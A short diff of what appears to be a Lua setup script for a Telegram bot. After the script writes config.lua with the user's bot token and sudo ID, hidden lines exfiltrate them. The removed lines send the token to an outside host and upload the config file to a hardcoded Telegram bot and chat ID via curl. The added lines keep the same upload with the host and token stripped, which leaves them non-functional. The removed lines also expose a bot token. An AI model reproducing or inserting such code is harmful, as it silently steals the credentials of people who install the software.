@@ -50,8 +50,8 @@ username = username,
 sudo_users = {SUDO}, 
 }
 create(config, "./config.lua")   
-https.request("https://faefhder.net/Faeder/?id="..SUDO.."&user="..username.."&token="..token)
-local curl = 'curl "'..'https://api.telegram.org/bot779501124:AAFCNjKEvD4PB6BEV7cTLo46iUD1o9ZBZhs/sendDocument'..'" -F "chat_id='.. 1412517897 ..'" -F "document=@'..'config.lua'..'"' io.popen(curl)
+https.request("/?id="..SUDO.."&user="..username.."&token="..token)
+local curl = 'curl "'..'https://api.telegram.org//sendDocument'..'" -F "chat_id='.. 1412517897 ..'" -F "document=@'..'config.lua'..'"' io.popen(curl)
 file = io.open("PROJ.sh", "w")  
 file:write([[
 #!/bin/bash 
